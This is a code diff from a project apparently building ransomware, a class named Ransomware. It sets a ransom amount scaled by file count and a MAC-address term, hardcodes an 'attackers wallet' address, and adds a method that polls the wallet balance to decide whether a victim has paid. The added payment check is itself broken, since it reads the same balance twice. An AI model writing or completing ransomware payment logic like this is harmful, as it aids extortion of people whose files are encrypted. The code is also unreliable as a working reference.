@@ -17,7 +17,7 @@ class Ransomware:
     ENCODING = "utf-8"
     MAX_SIZE = 4096
 
-    bitcoin_needed = 0.001 #TODO: Assign this based on number of files
+    bitcoin_needed = 0.001 * number_of_files + 0.000000000001 * mac_address #TODO: Assign this based on number of files
     wallet_address = 'tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv' #address of attackers wallet
 
 
@@ -98,10 +98,16 @@ class Ransomware:
 
     #TODO Subin:
     def check_if_user_has_paid(self):
+        wallet_address = "tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv" #Attackers crypto wallet address
+        initial_balance =  cryptowallet.get_balance(wallet_address)
+
+        #TODO: Repolace with actual table
+
+        current_balance = cryptowallet.get_balance(wallet_address)
+        change = current_balance - initial_balance
         
-        return False
-
-
+        if (change == bitcoin_needed):
+            return True
 
     # Method that lists all of the non-hidden, non-vital  directories bellow the inserted directory
     def list_safe_directories(self, directory):
